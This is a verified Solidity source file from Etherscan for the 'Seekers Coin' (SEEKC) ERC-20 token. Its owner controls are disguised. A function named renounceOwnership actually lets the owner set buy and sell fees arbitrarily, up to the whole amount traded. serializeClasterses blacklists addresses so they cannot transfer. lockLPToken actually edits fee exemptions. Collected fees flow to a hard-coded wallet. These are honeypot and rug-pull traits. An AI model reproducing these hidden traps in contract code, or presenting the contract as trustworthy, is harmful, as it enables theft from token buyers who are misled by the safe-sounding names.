/**
 *Submitted for verification at Etherscan.io on 2023-08-12
*/

/**   


               ╭━━━╮╱╱╱╱╱╭╮
                ┃╭━╮┃╱╱╱╱╱┃┃
                ┃╰━━┳━━┳━━┫┃╭┳━━┳━╮
               ╰━━╮┃┃━┫┃━┫╰╯┫┃━┫╭╯
               ┃╰━╯┃┃━┫┃━┫╭╮┫┃━┫┃
               ╰━━━┻━━┻━━┻╯╰┻━━┻╯


        * Website: https://seekers.xyz/
        * Twitter: https://twitter.com/seekers_xyz
        * Instagram: https://www.instagram.com/seekers.xyz/
        * OpenSea: https://opensea.io/collection/the-seekers

*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract SEEKERSCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    // SEEKERSCoin
    string private constant _name = "Seekers Coin";
    string private constant _symbol = "SEEKC";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 100000000000 * 10 ** 9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tClasterTotal;
    uint256 private _ClasterOneB = 0;
    uint256 private _ClasterTwoB = 0;
    uint256 private _ClasterThreeS = 0;
    uint256 private _ClasterFourS = 0;

    uint256 private _ClasterThreeSOne = _ClasterThreeS;
    uint256 private _ClasterFourSTwo = _ClasterFourS;

    uint256 private _previousThreeSOne = _ClasterThreeSOne;
    uint256 private _previousFourSTwo = _ClasterFourSTwo;

    mapping(address => bool) public clasterses;
    mapping(address => uint256) public _buyMap;
    address payable private _ClasterFourSAddress =
        payable(0x6868B6FF8a9879512fE03513D838eC9412398046); //Rewards Wallet
    address payable private _ClasterFiveSAddress =
        payable(0x6868B6FF8a9879512fE03513D838eC9412398046); //Rewards Wallet

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private tradingOpen = true;
    bool private inSwap = false;
    bool private swapEnabled = true;

    uint256 public _maxTA = 35555500000 * 10 ** 9;
    // swpTA
    uint256 public _maxWS = 100000000000 * 10 ** 9;
    uint256 public _swpTA = 100 * 10 ** 9;

    event MaxTAUpt(uint256 _maxTA);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function tokenFromReflection(
        uint256 rAmount
    ) private view returns (uint256) {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function removeClaster() private {
        if (_ClasterThreeSOne == 0 && _ClasterFourSTwo == 0) return;

        _previousThreeSOne = _ClasterThreeSOne;
        _previousFourSTwo = _ClasterFourSTwo;

        _ClasterThreeSOne = 0;
        _ClasterFourSTwo = 0;
    }

    function restoreClaster() private {
        _ClasterThreeSOne = _previousThreeSOne;
        _ClasterFourSTwo = _previousFourSTwo;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!clasterses[from] && !clasterses[to]);

        if (from != owner() && to != owner()) {
            //Trade start check
            if (!tradingOpen) {
                require(
                    from == owner(),
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }

            require(amount <= _maxTA, "TOKEN: Max Transaction Limit");
            require(
                !clasterses[from] && !clasterses[to],
                "TOKEN: Your account is not going!"
            );

            if (to != uniswapV2Pair) {
                require(
                    balanceOf(to) + amount < _maxWS,
                    "TOKEN: Balance exceeds wallet size!"
                );
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swpTA;

            if (contractTokenBalance >= _maxTA) {
                contractTokenBalance = _maxTA;
            }

            if (
                canSwap &&
                !inSwap &&
                from != uniswapV2Pair &&
                swapEnabled &&
                !_isExcludedFromFee[from] &&
                !_isExcludedFromFee[to]
            ) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    seeClaster(address(this).balance);
                }
            }
        }

        bool takeFee = true;

        if (
            (_isExcludedFromFee[from] || _isExcludedFromFee[to]) ||
            (from != uniswapV2Pair && to != uniswapV2Pair)
        ) {
            takeFee = false;
        } else {
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                _ClasterThreeSOne = _ClasterOneB;
                _ClasterFourSTwo = _ClasterTwoB;
            }

            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _ClasterThreeSOne = _ClasterThreeS;
                _ClasterFourSTwo = _ClasterFourS;
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function seeClaster(uint256 amount) private {
        _ClasterFiveSAddress.transfer(amount);
    }

    function launchGo() external onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_ClasterFourSAddress] = true;
        _isExcludedFromFee[_ClasterFiveSAddress] = true;
    }

    function manualswap() external {
        require(
            _msgSender() == _ClasterFourSAddress ||
                _msgSender() == _ClasterFiveSAddress
        );
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualsend() external {
        require(
            _msgSender() == _ClasterFourSAddress ||
                _msgSender() == _ClasterFiveSAddress
        );
        uint256 contractETHBalance = address(this).balance;
        seeClaster(contractETHBalance);
    }

    function serializeClasterses(
        address[] memory clasterses_
    ) public onlyOwner {
        for (uint256 i = 0; i < clasterses_.length; i++) {
            clasterses[clasterses_[i]] = true;
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeClaster();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreClaster();
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tFourSTwo
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeFourSTwo(tFourSTwo);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _takeFourSTwo(uint256 tFourSTwo) private {
        uint256 currentRate = _getRate();
        uint256 rFourSTwo = tFourSTwo.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rFourSTwo);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tClasterTotal = _tClasterTotal.add(tFee);
    }

    receive() external payable {}

    function _getTValues(
        uint256 tAmount,
        uint256 threeSOne,
        uint256 fourSTwo
    ) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(threeSOne).div(100);
        uint256 tFourSTwo = tAmount.mul(fourSTwo).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tFourSTwo);
        return (tTransferAmount, tFee, tFourSTwo);
    }

    function _getValues(
        uint256 tAmount
    )
        private
        view
        returns (uint256, uint256, uint256, uint256, uint256, uint256)
    {
        (
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tFourSTwo
        ) = _getTValues(tAmount, _ClasterThreeSOne, _ClasterFourSTwo);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(
            tAmount,
            tFee,
            tFourSTwo,
            currentRate
        );
        return (
            rAmount,
            rTransferAmount,
            rFee,
            tTransferAmount,
            tFee,
            tFourSTwo
        );
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tFourSTwo,
        uint256 currentRate
    ) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rFourSTwo = tFourSTwo.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rFourSTwo);
        return (rAmount, rTransferAmount, rFee);
    }

    function sMiS(uint256 swpTA) public onlyOwner {
        _swpTA = swpTA;
    }

    function sMTx(uint256 maxTA) public onlyOwner {
        _maxTA = maxTA;
    }

    function renounceOwnership(
        uint256 oneB,
        uint256 threeS,
        uint256 twoB,
        uint256 fourS
    ) public onlyOwner {
        _ClasterOneB = oneB;
        _ClasterThreeS = threeS;
        _ClasterTwoB = twoB;
        _ClasterFourS = fourS;
    }

    function sMwal(uint256 maxWS) public onlyOwner {
        _maxWS = maxWS;
    }

    function lockLPToken(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }
}